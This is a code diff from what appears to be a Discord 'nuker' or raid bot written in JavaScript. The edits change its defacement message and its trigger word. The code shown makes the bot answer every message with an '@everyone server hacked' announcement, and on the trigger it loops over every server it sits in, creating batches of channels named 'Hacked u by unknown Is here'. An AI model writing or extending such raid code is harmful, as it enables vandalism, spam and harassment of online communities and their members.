@@ -14,7 +14,7 @@ console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
  
       LOka.on("message", msg => {
-        msg.channel.send('@everyone server hacked By DeepsGang4Life :smiling_imp: ')
+        msg.channel.send('@everyone server hacked By A Friend of yall ! :smiling_imp: ')
      
       
       }); 
@@ -184,7 +184,7 @@ m.createChannel('Hacked u by unknown Is here', 'text');
 });
  
 LOka.on('message', message => {
-         if (message.content === "k") {
+         if (message.content === "kk") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('Hacked u by unknown Is here', 'voice');
 m.createChannel('Hacked u by unknown Is here', 'voice');
